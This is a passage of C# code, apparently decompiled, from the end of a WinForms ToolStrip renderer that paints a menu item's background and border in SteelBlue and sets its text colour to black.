					Pen pen = new Pen(Color.SteelBlue);
					SolidBrush solidBrush2 = new SolidBrush(Color.SteelBlue);
					toolStripItemRenderEventArgs_0.Item.ForeColor = Color.Black;
					Rectangle rectangle2 = new Rectangle(Point.Empty, toolStripItemRenderEventArgs_0.Item.Size);
					toolStripItemRenderEventArgs_0.Graphics.FillRectangle(solidBrush2, rectangle2);
					toolStripItemRenderEventArgs_0.Graphics.DrawRectangle(pen, 0, 0, rectangle2.Width, rectangle2.Height);
					pen.Dispose();
					solidBrush2.Dispose();
				}
			}
		}
	}
}
